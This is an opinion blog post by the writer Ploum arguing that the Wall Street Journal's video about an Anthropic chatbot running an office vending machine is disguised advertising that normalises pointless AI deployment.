<p>You probably heard about the Wall Street Journal story where they had a snack-vending machine run by a chatbot created by Anthropic.</p>
<p>At first glance, it is funny and it looks like journalists doing their job criticising the AI industry. If you are curious, the video is there (requires JS).</p>
<ul>
<li><a href="https://www.wsj.com/tech/ai/anthropic-claude-ai-vending-machine-agent-b7e84e34">We Let AI Run Our Office Vending Machine. It Lost Hundreds of Dollars.(www.wsj.com)</a></li>
</ul>
<p>But what appears to be journalism is, in fact, pure advertising. For both WSJ and Anthropic. Look at how WSJ journalists are presented as "world class", how no-subtle the Anthropic guy is when telling them they are the best and how the journalist blush at it. If you are taking the story at face value, you are failing for the trap which is simple: "AI is not really good but funny, we must improve it."</p>
<p>The first thing that blew my mind was how stupid the whole idea is. Think for one second. One full second. Why do you ever want to add a chatbot to a snack vending machine? The video states it clearly: the vending machine must be stocked by humans. Customers must order and take their snack by themselves. The AI has no value at all.</p>
<p>Automated snack vending machine is a solved problem since nearly a century. Why do you want to make your vending machine more expensive, more error-prone, more fragile and less efficient for your customers?</p>
<p>What this video is really doing is normalising the fact that "even if it is completely stupid, AI will be everywhere, get used to it!"</p>
<p>The Anthropic guy himself doesn’t seem to believe his own lies, to the point of making me uncomfortable. Toward the ends, he even tries to warn us: "Claude AI could run your business but you don’t want to come one day and see you have been locked out." At which the journalist adds, "Or has ordered 100 PlayStations."</p>
<p>And then he gives up:</p>
<p>"Well, the best you can do is probably prepare for that world."</p>
<figure>
<a href="https://ploum.net/files/prepareworld.png"><img alt="Still from the video where Anthropic’s employee says &quot;probably prepare for that world&quot;" src="https://ploum.net/files/prepareworld.png" width="450"></a>
<figcaption>Still from the video where Anthropic’s employee says "probably prepare for that world"</figcaption>
</figure>
<p>None of the world class journalists seemed to care. They are probably too badly paid for that. I was astonished to see how proud they were, having spent literally hours chatting with a bot just to get a free coke, even queuing for the privilege of having a free coke. A coke that cost a few minutes of minimum-wage work.</p>
<p>So the whole thing is advertising a world where chatbots will be everywhere and where world-class workers will do long queue just to get a free soda.</p>
<p>And the best advice about it is that you should probably prepare for that world.</p>

<div><p>I’m <a href="https://fr.wikipedia.org/wiki/Ploum">Ploum</a>, a writer and an engineer. I like to explore how technology impacts society. You can subscribe <a href="https://listes.ploum.net/mailman3/lists/en.listes.ploum.net/">by email</a> or <a href="https://ploum.net/atom_en.xml">by rss</a>. I value privacy and never share your adress.</p>
<p>I write <a href="https://pvh-editions.com/ploum">science-fiction novels in French</a>. For <a href="https://bikepunk.fr/">Bikepunk</a>, my new post-apocalyptic-cyclist book, my publisher is looking for contacts in other countries to distribute it in languages other than French. If you can help, <a href="https://ploum.net/about.html">contact me</a>!</p> 

</div>
</article></div>]]></description>
        </item>
    </channel>
</rss>